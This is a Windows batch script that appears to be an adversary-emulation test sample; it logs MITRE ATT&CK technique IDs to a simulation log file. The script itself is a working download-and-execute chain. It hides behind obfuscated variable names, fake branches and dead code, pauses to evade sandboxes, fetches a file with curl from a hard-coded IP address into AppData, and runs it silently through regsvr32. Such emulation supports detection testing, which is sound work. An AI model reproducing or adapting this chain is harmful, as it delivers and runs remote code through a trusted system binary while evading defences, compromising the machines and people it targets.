@echo off
SETLOCAL EnableDelayedExpansion

REM PHR placeholder assignments (random-named SET vars, one per PHR)
SET akjdh=%APPDATA%\14291\95c6a813
SET vbnmc=c501a752.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?RVFBTW4-R1dH
SET plkmj=BALAM-S2BO
SET qwert=RVFBTW4
SET asdfg=R1dH
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM Timestamp and logging variables (immediate expansion for %DATE%/%TIME%)
SET tsvar=%DATE% / %TIME%
SET logvar=!zxcvb!
SET agentvar=!plkmj!
SET simidvar=!qwert!

REM LOLBIN variable (regsvr32.exe)
SET rtyui=regsvr32.exe

REM Obfuscated entry – fake conditional branch
IF 1==1 (
    GOTO start_real
) ELSE (
    GOTO dead_fake
)

:dead_fake
EXIT

:start_real
SET state=0
GOTO dispatch

REM Dead code labels (unreachable)
:dead_label1
GOTO END

:dead_label2
SET dummy=0
GOTO END

:dead_label3
EXIT

:dead_label4
GOTO dead_label1

:dispatch
IF %state%==0 GOTO state_init
IF %state%==1 GOTO state_log_obfuscation
IF %state%==2 GOTO state_sandbox_delay
IF %state%==3 GOTO state_log_evasion
IF %state%==4 GOTO state_heartbeat
IF %state%==5 GOTO state_chdir
IF %state%==6 GOTO state_execute_lolbin
IF %state%==7 GOTO state_log_lolbin
IF %state%==8 GOTO state_pre_end
IF %state%==99 GOTO END
GOTO END

:state_init
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: script_start>> "%logvar%" 2>nul
SET state=1
GOTO dispatch

:state_log_obfuscation
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1027^|Obfuscated Files or Information=[OK]:>> "%logvar%" 2>nul
SET state=2
GOTO dispatch

:state_sandbox_delay
timeout /t 18 /nobreak >nul
SET state=3
GOTO dispatch

:state_log_evasion
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion=[OK]:>> "%logvar%" 2>nul
SET state=4
GOTO dispatch

:state_heartbeat
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_start>> "%logvar%" 2>nul
curl -k -s -o "!akjdh!\!vbnmc!" "!zxmqp!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_fail>> "%logvar%" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_complete>> "%logvar%" 2>nul
)
REM Random delay (10-29s)
SET /A rnd=!RANDOM! %% 20 + 10
timeout /t !rnd! /nobreak >nul
REM Additional delay between operations
ping -n 5 127.0.0.1 >nul
SET state=5
GOTO dispatch

:state_chdir
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_start>> "%logvar%" 2>nul
cd /d "!akjdh!" >nul 2>&1
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=1>> "%logvar%" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=0>> "%logvar%" 2>nul
)
for /l %%i in (1,1,8) do timeout /t 1 /nobreak >nul
SET state=6
GOTO dispatch

:state_execute_lolbin
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: regsvr32_start>> "%logvar%" 2>nul

REM Initialize result variable, then invoke regsvr32 unconditionally
SET lolbin_result=FAIL
!rtyui! /s "!vbnmc!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: regsvr32_fail>> "%logvar%" 2>nul
    SET lolbin_result=FAIL
) ELSE (
    echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: regsvr32_complete>> "%logvar%" 2>nul
    SET lolbin_result=OK
)
SET state=7
GOTO dispatch

:state_log_lolbin
REM Unconditional TTP log – result based on captured ERRORLEVEL
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=[!lolbin_result!]:>> "%logvar%" 2>nul
SET state=8
GOTO dispatch

:state_pre_end
SET state=99
GOTO dispatch

:END
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: script_end>> "%logvar%" 2>nul
ENDLOCAL
EXIT /b 0